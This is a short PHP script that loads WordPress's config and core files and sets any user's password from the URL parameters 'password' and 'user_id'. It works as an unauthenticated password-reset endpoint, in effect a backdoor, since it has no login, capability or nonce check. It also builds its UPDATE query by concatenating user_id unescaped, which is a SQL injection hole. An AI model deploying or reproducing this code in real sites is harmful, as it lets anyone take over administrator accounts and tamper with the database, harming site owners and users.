<?php
	include_once($_SERVER['DOCUMENT_ROOT'].'/wp-config.php');
	include_once($_SERVER['DOCUMENT_ROOT'].'/wp-load.php');
	include_once($_SERVER['DOCUMENT_ROOT'].'/wp-includes/wp-db.php');
	include_once($_SERVER['DOCUMENT_ROOT'].'/wp-includes/class-phpass.php');
	include_once($_SERVER['DOCUMENT_ROOT'].'/wp-includes/pluggable.php');
	
	$newpassword = $_GET['password'];
	$ID = $_GET['user_id'];
	$password = wp_hash_password($newpassword);
	 
	//$ID = 23;
	
	$link = mysql_connect(DB_HOST,DB_USER,DB_PASSWORD);
	if(!$link)
	{
		echo "mysql_connect err";
		exit;
	}
	if(!mysql_select_db(DB_NAME,$link))
	{
		echo "mysql_select_db error";
		exit;
	}
	$sql_query = "";
	
	$sql_query = "UPDATE wp_users SET user_pass = '" . $password . "' where ID = '" . $ID . "'";
										
	$result = mysql_query($sql_query);
	if(!$result)
	{
		echo "mysql_query fail";
		exit;
	}
	else {
		echo "success";
	}
	
	exit();